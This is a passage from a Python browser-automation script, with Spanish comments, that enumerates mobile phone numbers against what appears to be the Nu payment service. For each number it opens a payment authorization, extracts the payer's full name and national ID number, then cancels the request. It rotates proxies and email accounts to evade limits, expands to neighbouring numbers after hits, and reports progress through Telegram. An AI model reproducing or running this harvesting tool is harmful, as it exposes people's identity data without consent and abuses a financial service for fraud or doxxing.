            try:
                await page_nu.wait_for_timeout(1500)  # dejar que cargue
                detalles = await page_nu.evaluate(JS_NU_DETALLES, auth_id)
                ref3 = _buscar_valor(detalles, ("ref3",))
                if ref3:
                    try:
                        payer = detalles["authorization"]["authorization_request"]\
                                      ["liquidation_method"]["options"]["payer"]
                    except Exception:
                        payer = {}
                    datos = {"ref3": ref3, "payer": payer if isinstance(payer, dict) else {}}
                    try:
                        await page_nu.evaluate(JS_NU_CANCELAR, auth_id)
                    except Exception:
                        pass
            except Exception as e:
                print(f"[i] fetch interno Nu falló ({type(e).__name__}) -> aiohttp")
                datos = await nu_api_procesar(auth_id)

            if not datos or not datos.get("ref3"):
                print(f"[!] Sin referencia para {celular}")
                return "sin_ref"

            ref3 = datos["ref3"]
            payer = datos.get("payer") or {}
            nombre = str(payer.get("name", "")).strip()
            cedula = str(payer.get("tax_id", "")).strip()

            print(f"[OK] {celular} -> ref3 {ref3} | {nombre} | CC {cedula}")
            await chequear_y_guardar(celular, ref3, nombre, cedula)
            return "ok"

        except Exception as e:
            print(f"[!] Error {celular}: {e}")
            return "error"
        finally:
            await browser.close()

async def procesar_un_celular(celular):
    proxys = cargar_proxies() if USAR_PROXY else [None]
    if not proxys:
        proxys = [None]
    random.shuffle(proxys)
    for px in proxys:
        for _ in range(10):
            estado = await ejecutar(celular, px)
            if estado == "correo_agotado":
                continue
            if estado in ("ok", "sin_cuenta"):
                return estado
            break
    return "error"

# ======================================================================
#  WORKERS
# ======================================================================
intentos_total = 0

async def worker(n):
    global intentos_total
    while True:
        if LIMITE is not None and intentos_total >= LIMITE:
            return
        celular = siguiente_celular()
        intentos_total += 1
        print(f"\n===== [W{n}] Intento {intentos_total} | celular: {celular} =====")
        try:
            estado = await procesar_un_celular(celular)
        except Exception as e:
            print(f"[W{n}] error {celular}: {e}")
            estado = "error"

        exito = estado in ("ok", "sin_ref")
        await mem.registrar(celular, exito)
        if exito:
            agregar_vecinos(celular)

        if intentos_total % 25 == 0:
            print(f"[mem] Tasa actual: {mem.tasa_acierto()*100:.2f}% "
                  f"({mem.data['aciertos']}/{mem.data['intentos']})")

async def main():
    cargar_correo_guardado()
    _sembrar_desde_memoria()

    arg = sys.argv[1] if len(sys.argv) > 1 else None
    if arg and arg.isdigit() and len(arg) >= 10:
        _marcar_usado(arg)
        _pila_vecinos.appendleft(arg)

    await tg.start()
    if tg.activo:
        asyncio.create_task(tg.poll())
        await tg.actualizar_contador()
        print("[i] Telegram activo")
    else:
        print("[i] Telegram desactivado (falta token)")

    asyncio.create_task(mem.guardar_periodico())

    print(f"[i] Correo inicial: {correo_actual()}")
    print(f"[i] Tasa histórica: {mem.tasa_acierto()*100:.2f}%")
    print(f"[i] Concurrencia: {CONCURRENCIA} | Límite: {LIMITE or 'infinito'}")
    await asyncio.gather(*[worker(i + 1) for i in range(CONCURRENCIA)])

if __name__ == "__main__":
    print(">>> INICIANDO ...")
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] Detenido por el usuario (Ctrl+C)")
    except Exception:
        import traceback
        traceback.print_exc()
    print(">>> FIN")